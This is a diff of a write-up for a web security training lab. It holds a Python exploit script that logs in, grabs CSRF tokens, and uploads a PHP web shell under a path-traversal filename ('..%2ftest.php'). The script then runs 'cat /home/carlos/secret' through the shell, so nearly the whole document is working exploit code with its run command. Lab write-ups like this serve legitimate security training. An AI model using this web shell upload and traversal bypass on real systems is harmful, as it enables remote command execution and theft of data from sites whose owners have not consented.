@@ -1,6 +1,7 @@
-Target Goal - Exploit the file upload vulnerability to exfiltrate the contents of the file /home/carlos/secret
+Target Goal - Exploit file upload vulnerability to upload a PHP web shell and exfiltrate the contents of the /home/carlos/secret
 
 Creds - wiener:peter
+
 
 Analysis:
 
@@ -17,19 +18,19 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
 
 def get_csrf_token(s, url):
+
     r = s.get(url, verify=False, proxies=proxies)
     soup = BeautifulSoup(r.text, 'html.parser')
-    csrf = soup.find("input", {"name": "csrf"})['value']
+    csrf = soup.find("input", {'name': 'csrf'})['value']
     return csrf
-
 
 def exploit_file_upload(s, url):
 
     # Get CSRF token
-    login_url = url + "/login"
+    login_url = url + '/login'
     csrf_token = get_csrf_token(s, login_url)
 
-    # Loggin in as the wiener user
+    # Login as wiener
     print("(+) Logging in as the wiener user...")
     data_login = {'csrf': csrf_token, 'username': 'wiener', 'password': 'peter'}
     r = s.post(login_url, data=data_login, verify=False, proxies=proxies)
@@ -37,14 +38,14 @@ def exploit_file_upload(s, url):
     if 'Log out' in r.text:
         print("(+) Successfully logged in as the wiener user...")
 
-        # Uploading URL
+        # Uploading avatar
         print("(+) Uploading web shell...")
-        account_url = url + "/my-account"
-        csrf_token = get_csrf_token(s, account_url)
-        avatar_url = url + "/my-account/avatar"
-        params = {"avatar": ('test.php', "<?php system($_GET['cmd']);?>", 'application/x-php'), 
-        "user": "wiener",
-        "csrf": csrf_token}
+        my_account_url = url + '/my-account'
+        csrf_token = get_csrf_token(s, my_account_url)
+        avatar_url = url + '/my-account/avatar'
+        params = {'avatar': ('..%2ftest.php', "<?php system($_GET['cmd']); ?>", "application/x-php"),
+        'user': 'wiener',
+        'csrf': csrf_token}
 
         boundary = '------WebKitFormBoundary' + ''.join(random.sample(string.ascii_letters + string.digits, 16))
 
@@ -54,19 +55,18 @@ def exploit_file_upload(s, url):
 
         r = s.post(avatar_url, data=m, headers=headers, verify=False, proxies=proxies)
 
+        # Execute web shell
         print("(+) The following is the content of the secret file: ")
-        cmd_url = url + '/files/avatars/test.php?cmd=' + 'cat /home/carlos/secret'
+        cmd_url = url + '/files/test.php?cmd=cat /home/carlos/secret'
         r = s.get(cmd_url, verify=False, proxies=proxies)
         print(r.text)
-
     else:
-        print("(-) Could not login as the user.")
+        print("(-) Could not login as user.")
         sys.exit(-1)
 
 
-
 def main():
-    if len(sys.argv) != 2:
+    if len(sys.argv) !=2:
         print("(+) Usage: %s <url>" % sys.argv[0])
         print("(+) Example: %s www.example.com" % sys.argv[0])
         sys.exit(-1)
@@ -75,13 +75,11 @@ def main():
     url = sys.argv[1]
     exploit_file_upload(s, url)
 
-
 if __name__ == "__main__":
     main()
 ```
-
 RUN:
 ```bash
-python3 upload-file-lab-01.py 'https://ac0b1f8d1ff73e428074793800860063.web-security-academy.net'
+python3 upload-file-lab-03.py 'https://ac0b1f8d1ff73e428074793800860063.web-security-academy.net'
 ```
 END!
